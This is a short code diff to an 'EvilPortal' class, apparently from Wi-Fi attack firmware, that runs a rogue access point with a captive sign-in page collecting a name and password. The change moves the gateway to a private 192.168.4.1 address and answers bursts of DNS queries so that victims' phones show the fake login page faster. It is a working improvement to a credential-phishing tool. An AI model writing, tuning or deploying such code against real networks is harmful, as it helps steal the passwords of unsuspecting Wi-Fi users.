@@ -442,7 +442,11 @@ bool EvilPortal::setAP(String essid) {
 }
 
 void EvilPortal::startAP() {
-  const IPAddress AP_IP(172, 0, 0, 1);
+  // Standard private captive-portal gateway. The old 172.0.0.1 is a PUBLIC
+  // address (the RFC1918 172 block is 172.16-172.31 only); phones' captive-
+  // portal detection triggers faster and more reliably against a conventional
+  // private gateway, so the sign-in page pops right away instead of "eventually".
+  const IPAddress AP_IP(192, 168, 4, 1);
 
   // Bring the softAP up, retrying a few times. After a long/dense AP scan the
   // internal (DMA) heap can be fragmented, or the previous mode's radio teardown
@@ -516,7 +520,12 @@ void EvilPortal::main(uint8_t scan_mode) {
     return;
   }
 
-  this->dnsServer.processNextRequest();
+  // Drain all DNS queries waiting this iteration, not just one. On connect a
+  // phone fires a burst of captive-detection lookups; answering them all now
+  // (bounded so we never hog the loop) makes the sign-in page appear promptly
+  // instead of after the phone's retry timeout.
+  for (int i = 0; i < 12; i++)
+    this->dnsServer.processNextRequest();
 
   if (this->name_received && this->password_received) {
     this->name_received = false;
